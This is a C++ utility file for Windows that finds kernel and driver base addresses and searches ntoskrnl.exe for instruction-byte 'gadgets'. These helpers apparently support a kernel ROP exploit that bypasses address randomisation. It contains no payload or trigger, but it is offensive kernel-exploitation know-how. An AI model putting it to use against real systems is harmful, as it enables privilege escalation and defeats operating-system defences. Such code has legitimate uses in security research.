#include "util.h"
#include <algorithm>
#include <iostream>


QWORD util::getBaseAddr(LPCWSTR drvname)
{
    LPVOID drivers[1024];
    DWORD cbNeeded;
    int nDrivers, i = 0;

    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
    {
        WCHAR szDrivers[1024];
        nDrivers = cbNeeded / sizeof(drivers[0]);
        for (i = 0; i < nDrivers; i++)
        {
            if (GetDeviceDriverBaseName(drivers[i], szDrivers, sizeof(szDrivers) / sizeof(szDrivers[0])))
            {
                if (wcscmp(szDrivers, drvname) == 0)
                {
                    return (QWORD)drivers[i];
                }
            }
        }
    }
    return 0;
}

GADGETS util::GetGadgets(OPS ops) {
    GADGETS gadgets = {};
    HMODULE lpFileName = LoadLibrary(L"C:\\Windows\\System32\\ntoskrnl.exe");
    if (!lpFileName) {
        printf("error getting handle to ntoskrnl, error code: %x\n", GetLastError());
        exit(-1);
    }
    for (std::map<std::string, std::vector<BYTE>>::iterator iter = ops.begin(); iter != ops.end(); ++iter)
    {
        std::string k = iter->first;
        unsigned char* v = (unsigned char*)&iter->second[0];
        QWORD gadgetOffset = FindGadget(lpFileName, v, (SIZE_T)iter->second.size());
        if (gadgetOffset == -1) {
            printf("gadget lookup failed for %s\n", iter->first.c_str());
            printf("byte array searched: %02X %02X %02X %02X\n", v[0],v[1],v[2],v[3]);
            exit(-1);
        }
        gadgets[k] = gadgetOffset;
    }
    return gadgets;
}

QWORD util::FindGadget(HMODULE moduleName, BYTE* opCodeArray, SIZE_T opCodeSize) {
    PBYTE buffer = (PBYTE)moduleName;
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)buffer;
    PIMAGE_NT_HEADERS ntHeader;
    buffer += dosHeader->e_lfanew;
    ntHeader = (PIMAGE_NT_HEADERS)buffer;
    IMAGE_OPTIONAL_HEADER opHeader;
    opHeader = ntHeader->OptionalHeader;

    BYTE* ntoskrnlBuf = NULL;
    ntoskrnlBuf = (BYTE*)malloc(opHeader.SizeOfCode);

    printf("lfanew: %d\t sizeofcode: %d\n", dosHeader->e_lfanew, opHeader.SizeOfCode);

    if (ntoskrnlBuf == NULL) {
        printf("failed ntoskrnbuf malloc\n");
        exit(-1);
    }
    SIZE_T sizeRead;
    if (!ReadProcessMemory(GetCurrentProcess(), moduleName, ntoskrnlBuf, opHeader.SizeOfCode, &sizeRead)) {
        printf("failed ReadProcessMemory, error code: %x\n", GetLastError());
        exit(-1);

    }

    BYTE* buf = ntoskrnlBuf;
    PBYTE bufLast = buf + opHeader.SizeOfCode;
    BYTE* pattern = opCodeArray;
    PBYTE patternLast = pattern + opCodeSize;
    // std::search would search from start, however at start more gadgets are non paged in the kernel
    PBYTE occurence = std::find_end(buf, bufLast, pattern, patternLast);// returns iterator to first occurence of sequence

    BOOL found = (occurence != bufLast);

    if (found)
    {
        printf("lookup success for %02X %02X %02X %02X\n", pattern[0], pattern[1], pattern[2], pattern[3]);
        printf("address: %llx\n",occurence - buf);
        return occurence - buf;
    }
    else
    {
        printf("lookup failed for %02X %02X %02X %02X\n", pattern[0], pattern[1], pattern[2], pattern[3]);
        printf("size = %d\n", opHeader.SizeOfCode);
        printf("pattern size = %llud\n", opCodeSize);
        exit(-1);
        return -1;
    }
}

QWORD util::GetKernelBase() {
    QWORD kernelBase = NULL;


    RTL_PROCESS_MODULES modInfo = { 0 };
    ULONG SysInfoLength = sizeof(RTL_PROCESS_MODULES);
    HMODULE ntDllHandle = GetModuleHandleA("ntdll.dll");
    if (!ntDllHandle) {
        printf("Failed getting handle to ntdll, error code %d\n", GetLastError());
        exit(-1);
    }

    void* ZwQuerySystemInformationPtr = (void*)GetProcAddress(ntDllHandle, "ZwQuerySystemInformation");

    if (!ZwQuerySystemInformationPtr) {
        printf("failed getting zwQuery\t error code: %d\n", GetLastError());
        exit(-1);
    }

    using ZwQuerySystemInformationFn = NTSTATUS(WINAPI*)(int, PVOID, ULONG, PULONG);
    ZwQuerySystemInformationFn ZwQuerySystemInformation = (ZwQuerySystemInformationFn)ZwQuerySystemInformationPtr;

    NTSTATUS ZwStatus = ZwQuerySystemInformation(0xb, (PVOID)&modInfo, SysInfoLength, &SysInfoLength);

    //if (ZwStatus) {
    //    printf("failed ZwQuery, error code: %lu\n", ZwStatus);
    //    exit(-1);
    //}

    kernelBase = (QWORD)modInfo.Modules->ImageBase;

    if (!kernelBase) {
        printf("Error getting base address of Ntoskrnl.exe\n");
        exit(-1);
    }
    return kernelBase;
}